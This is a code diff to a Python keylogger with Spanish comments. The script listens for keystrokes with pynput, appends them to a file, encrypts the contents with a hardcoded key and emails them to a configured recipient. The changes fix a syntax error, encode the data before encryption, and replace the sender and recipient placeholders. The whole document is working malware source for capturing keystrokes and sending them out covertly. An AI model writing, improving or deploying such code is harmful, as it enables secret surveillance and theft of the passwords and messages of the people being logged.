@@ -35,7 +35,7 @@ def on_press(key):
         keys = []
 
 def write_file(keys):
-    global sender, recipient, global clave
+    global sender, recipient, clave
     with open(path, 'a') as f:
         for key in keys:
             k = str(key).replace("'", "")
@@ -54,14 +54,12 @@ def write_file(keys):
 
     # Mandamos correo
     data = "\n".join(open(path,"r").readlines())
-    enviar_correo(sender, recipient, cifrar(data, clave))
+    enviar_correo(sender, recipient, cifrar(data.encode('utf-8'), clave))
 
 
 if __name__=="__main__":
-    sender = ['tucorreo@gmail.com', 'tupassword']
-    recipient = 'correodestino@example.com'
-    clave = "pepepepepepepep"
+    sender = ['correo que lo envia', 'su contraseña']
+    recipient = 'correo a donde se va a enviar'
+    clave = b'W3NFJwDhdDLeE48araLk2P_kETmFjPhct-kif7QhgI4='
     with Listener(on_press=on_press) as listener:
         listener.join()
-
-
